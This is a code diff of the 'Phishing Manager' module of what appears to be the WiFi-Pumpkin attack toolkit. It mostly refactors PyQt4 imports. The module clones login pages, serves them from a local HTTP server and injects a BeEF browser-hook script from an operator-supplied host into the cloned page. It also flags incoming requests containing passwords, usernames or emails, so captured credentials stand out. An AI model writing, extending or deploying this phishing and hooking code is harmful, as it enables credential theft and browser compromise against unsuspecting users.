@@ -1,13 +1,13 @@
-from PyQt4.QtCore import *
-from PyQt4.QtGui import *
 from os import popen
-from urllib2 import urlopen,URLError
+from urllib2 import urlopen, URLError
 from bs4 import BeautifulSoup
-from core.utils import ThreadPhishingServer
+import core.utility.constants as C
+from core.main import QtGui, QtCore
+from core.servers.http_handler.ServerHTTP import ServerThreadHTTP
 from core.utility.extract import Beef_Hook_url
 from core.utility.settings import frm_Settings
-from modules.servers.ServerHTTP  import ServerThreadHTTP
-import core.utility.constants as C
+from core.utils import ThreadPhishingServer
+
 """
 Description:
     This program is a module for wifi-pumpkin.py file which includes functionality
@@ -28,17 +28,17 @@ Copyright:
     You should have received a copy of the GNU General Public License
     along with this program.  If not, see <http://www.gnu.org/licenses/>
 """
-class frm_PhishingManager(QWidget):
+class frm_PhishingManager(QtGui.QWidget):
     def __init__(self, parent = None):
         super(frm_PhishingManager, self).__init__(parent)
-        self.label = QLabel()
-        self.Main  = QVBoxLayout()
+        self.label = QtGui.QLabel()
+        self.Main  = QtGui.QVBoxLayout()
         self.config = frm_Settings()
         self.session = str()
         self.setWindowTitle('Phishing Manager')
         self.ThreadTemplates = {'Server':[]}
         self.setGeometry(0, 0, 630, 100)
-        self.loadtheme(self.config.XmlThemeSelected())
+        self.loadtheme(self.config.get_theme_qss())
         self.center()
         self.UI()
 
@@ -49,7 +49,7 @@ class frm_PhishingManager(QWidget):
 
     def center(self):
         frameGm = self.frameGeometry()
-        centerPoint = QDesktopWidget().availableGeometry().center()
+        centerPoint = QtGui.QDesktopWidget().availableGeometry().center()
         frameGm.moveCenter(centerPoint)
         self.move(frameGm.topLeft())
 
@@ -62,71 +62,71 @@ class frm_PhishingManager(QWidget):
             self.statusLabel.setStyleSheet("QLabel {  color : red; }")
 
     def UI(self):
-        self.statusBar   = QStatusBar()
-        self.statusLabel = QLabel('')
-        self.statusBar.addWidget(QLabel('Status HTTP Server::'))
+        self.statusBar   = QtGui.QStatusBar()
+        self.statusLabel = QtGui.QLabel('')
+        self.statusBar.addWidget(QtGui.QLabel('Status HTTP Server::'))
         self.StatusServer(False)
         self.statusBar.addWidget(self.statusLabel)
         # left page
-        self.frmHtml     = QFormLayout()
-        self.frmOutput   = QFormLayout()
+        self.frmHtml     = QtGui.QFormLayout()
+        self.frmOutput   = QtGui.QFormLayout()
 
         # right page
-        self.frmSettings = QFormLayout()
-        self.frmCheckBox = QFormLayout()
-        self.frmClone    = QFormLayout()
-        self.frmButtons  = QFormLayout()
-        self.frmright    = QFormLayout()
-        self.frmleft     = QFormLayout()
+        self.frmSettings = QtGui.QFormLayout()
+        self.frmCheckBox = QtGui.QFormLayout()
+        self.frmClone    = QtGui.QFormLayout()
+        self.frmButtons  = QtGui.QFormLayout()
+        self.frmright    = QtGui.QFormLayout()
+        self.frmleft     = QtGui.QFormLayout()
 
         #group checkbox
-        self.check_custom   = QRadioButton('index.html  ')
-        self.check_server   = QRadioButton('Set Directory')
-        self.check_beef     = QCheckBox('Enable Beef')
-        self.check_clone    = QRadioButton('Website clone')
+        self.check_custom   = QtGui.QRadioButton('index.html  ')
+        self.check_server   = QtGui.QRadioButton('Set Directory')
+        self.check_beef     = QtGui.QCheckBox('Enable Beef')
+        self.check_clone    = QtGui.QRadioButton('Website clone')
         self.check_custom.setChecked(True)
 
         # group clone site
-        self.cloneLineEdit  = QLineEdit(self)
+        self.cloneLineEdit  = QtGui.QLineEdit(self)
         self.cloneLineEdit.setText('example.com/login')
         self.cloneLineEdit.setEnabled(False)
 
         # group settings
-        self.EditBeef       = QLineEdit(self)
-        self.EditDirectory  = QLineEdit('/var/www')
-        self.txt_redirect   = QLineEdit(self)
-        self.BoxPort        = QSpinBox(self)
+        self.EditBeef       = QtGui.QLineEdit(self)
+        self.EditDirectory  = QtGui.QLineEdit('/var/www')
+        self.txt_redirect   = QtGui.QLineEdit(self)
+        self.BoxPort        = QtGui.QSpinBox(self)
         self.EditBeef.setEnabled(False)
         self.EditDirectory.setEnabled(False)
         self.BoxPort.setMaximum(65535)
         self.BoxPort.setValue(80)
 
         # group left
-        self.Group_Html  = QGroupBox(self)
-        self.Group_List   = QGroupBox(self)
+        self.Group_Html  = QtGui.QGroupBox(self)
+        self.Group_List   = QtGui.QGroupBox(self)
         self.Group_Html.setTitle('index.html:')
         self.Group_List.setTitle('Requests:')
 
-        self.txt_html       = QTextEdit(self)
-        self.ListOutputWid  = QListWidget(self)
+        self.txt_html       = QtGui.QTextEdit(self)
+        self.ListOutputWid  = QtGui.QListWidget(self)
         self.txt_html.setFixedWidth(450)
         self.frmHtml.addRow(self.txt_html)
         self.frmOutput.addRow(self.ListOutputWid)
 
         # button stop,start
-        self.btn_start_template = QPushButton('Start Server')
-        self.btn_stop_template  = QPushButton('Stop Server')
-        self.btn_start_template.setIcon(QIcon('icons/start.png'))
-        self.btn_stop_template.setIcon(QIcon('icons/Stop.png'))
+        self.btn_start_template = QtGui.QPushButton('Start Server')
+        self.btn_stop_template  = QtGui.QPushButton('Stop Server')
+        self.btn_start_template.setIcon(QtGui.QIcon('icons/start.png'))
+        self.btn_stop_template.setIcon(QtGui.QIcon('icons/Stop.png'))
         self.btn_stop_template.setEnabled(False)
         self.btn_start_template.setFixedWidth(110)
         self.btn_stop_template.setFixedWidth(110)
         self.btn_start_template.clicked.connect(self.start_server)
 
         # group create
-        self.GroupSettings  = QGroupBox(self)
-        self.GroupCheckBox  = QGroupBox(self)
-        self.GroupCloneSite = QGroupBox(self)
+        self.GroupSettings  = QtGui.QGroupBox(self)
+        self.GroupCheckBox  = QtGui.QGroupBox(self)
+        self.GroupCloneSite = QtGui.QGroupBox(self)
         self.GroupSettings.setTitle('settings:')
         self.GroupCheckBox.setTitle('Options:')
         self.GroupCloneSite.setTitle('clone:')
@@ -180,7 +180,7 @@ class frm_PhishingManager(QWidget):
         self.frmleft.addRow(self.Group_Html)
         self.frmleft.addRow(self.Group_List)
 
-        layout = QHBoxLayout()
+        layout = QtGui.QHBoxLayout()
         layout.addLayout(self.frmleft)
         layout.addLayout(self.frmright)
 
@@ -188,7 +188,7 @@ class frm_PhishingManager(QWidget):
         self.Main.addWidget(self.statusBar)
         self.setLayout(self.Main)
 
-    @pyqtSlot(QModelIndex)
+    @QtCore.pyqtSlot(QtCore.QModelIndex)
     def check_options(self,index):
         if self.check_custom.isChecked():
             self.txt_html.setEnabled(True)
@@ -209,14 +209,14 @@ class frm_PhishingManager(QWidget):
 
     def start_server(self):
         if len(str(self.txt_redirect.text())) == 0:
-            return QMessageBox.warning(self,'localhost','Ip Address not found.')
+            return QtGui.QMessageBox.warning(self,'localhost','Ip Address not found.')
         if self.check_server.isChecked():
             if len(popen('which php').read().split('\n')[0]) == 0:
-                return QMessageBox.warning(self,'Requirement Software',
+                return QtGui.QMessageBox.warning(self,'Requirement Software',
                 'php-5 is not installed \n\ntry: install sudo apt-get install php5')
         if self.check_clone.isChecked():
             if len(self.cloneLineEdit.text()) == 0:
-                return QMessageBox.warning(self,'Clone','input clone empty')
+                return QtGui.QMessageBox.warning(self,'Clone','input clone empty')
             site = str(self.cloneLineEdit.text())
             if not str(self.cloneLineEdit.text()).startswith('http://'):
                 site = 'http://' + str(self.cloneLineEdit.text())
@@ -234,11 +234,11 @@ class frm_PhishingManager(QWidget):
                 a = urlopen('http://{}:{}'.format(str(self.txt_redirect.text()),self.BoxPort.value()))
                 if a.getcode() == 200:
                     self.StatusServer(True)
-                    self.emit(SIGNAL('Activated( QString )'),'started')
+                    self.emit(QtCore.SIGNAL('Activated( QString )'),'started')
 
         elif self.check_server.isChecked():
             self.DirectoryPhishing(Path=str(self.EditDirectory.text()))
-            self.emit(SIGNAL('Activated( QString )'),'started')
+            self.emit(QtCore.SIGNAL('Activated( QString )'),'started')
 
         elif self.check_custom.isChecked():
             self.html = BeautifulSoup(str(self.txt_html.toPlainText()),'lxml')
@@ -253,7 +253,7 @@ class frm_PhishingManager(QWidget):
             self.ServerHTTPLoad.setObjectName('THread::: HTTP Clone')
             self.ServerHTTPLoad.start()
             self.StatusServer(True)
-            self.emit(SIGNAL('Activated( QString )'),'started')
+            self.emit(QtCore.SIGNAL('Activated( QString )'),'started')
 
     def DirectoryPhishing(self,Path=None):
         popen('service apache2 stop')
@@ -273,11 +273,11 @@ class frm_PhishingManager(QWidget):
     def ResponseSignal(self,resp):
         form_ = ['pass','login','user','email']
         try:
-            newItem = QListWidgetItem(self.ListOutputWid)
+            newItem = QtGui.QListWidgetItem(self.ListOutputWid)
             newItem.setText(resp)
             for tag in form_:
                 if tag in str(resp).lower():
-                    newItem.setTextColor(Qt.green)
+                    newItem.setTextColor(QtCore.Qt.green)
                     break
             self.ListOutputWid.addItem(newItem)
             self.ListOutputWid.scrollToBottom()
@@ -294,13 +294,13 @@ class frm_PhishingManager(QWidget):
             except Exception: pass
             self.CheckHookInjection(request,C.TEMPLATE_CLONE)
         except URLError:
-            QMessageBox.warning(self,'Request HTTP','It seems like the server is down.')
+            QtGui.QMessageBox.warning(self,'Request HTTP','It seems like the server is down.')
             return False
         return True
 
     def cloneWebsite(self):
         if len(self.cloneLineEdit.text()) == 0:
-            return QMessageBox.warning(self,'Clone website','input clone empty')
+            return QtGui.QMessageBox.warning(self,'Clone website','input clone empty')
         site = str(self.cloneLineEdit.text())
         if not str(self.cloneLineEdit.text()).startswith('http://'):
             site = 'http://' + str(self.cloneLineEdit.text())
@@ -322,7 +322,7 @@ class frm_PhishingManager(QWidget):
             self.hook = '<script type="text/javascript" src="%s"></script>'%str(self.EditBeef.text())
             html_final = Beef_Hook_url(rasp,self.hook)
             if html_final != None:rasp = html_final
-            else: QMessageBox.information(self,'Error Hook Inject Page',
+            else: QtGui.QMessageBox.information(self,'Error Hook Inject Page',
                 'Hook Url not injected,not found tag "<body>"')
         with open(Save,'w') as f:
             f.write(str(rasp))
